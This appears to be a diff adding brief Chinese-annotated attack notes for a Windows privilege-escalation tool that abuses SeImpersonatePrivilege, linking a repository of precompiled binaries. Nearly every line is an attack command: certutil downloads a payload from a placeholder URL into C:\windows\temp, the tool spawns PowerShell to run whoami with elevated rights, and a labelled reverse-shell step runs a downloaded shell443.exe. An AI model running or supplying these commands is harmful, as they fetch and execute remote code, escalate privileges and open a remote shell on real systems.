@@ -1,0 +1,8 @@
+项目地址:https://github.com/jakobfriedl/precompiled-binaries/tree/main/PrivilegeEscalation/Token
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+C:\windows\temp\$badfile -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
+>反弹shell，需要先下载shell
+C:\windows\temp\$badfile -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\windows\temp\shell443.exe | Set-Content C:\temp\w.log"
+###
+这是一个利用SeImpersonatePrivilege特权进行提权的程序
+###
